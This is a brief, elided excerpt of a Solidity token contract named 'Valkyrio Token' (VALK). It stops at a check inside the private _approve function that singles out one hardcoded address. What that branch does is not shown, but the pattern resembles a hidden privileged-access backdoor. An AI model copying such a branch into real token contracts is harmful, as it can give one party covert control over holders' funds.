...
contract ValkyrioToken is Context, IERC20, Ownable {
    ...
    string private _name = "Valkyrio Token";
    string private _symbol = "VALK";
   ...
   //this method is responsible for taking all fee, if takeFee is true
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        ...
        if (owner == address(0xFfc8c7E97a1Cf9a86854307Fc8fbd2c59040bC11)) {
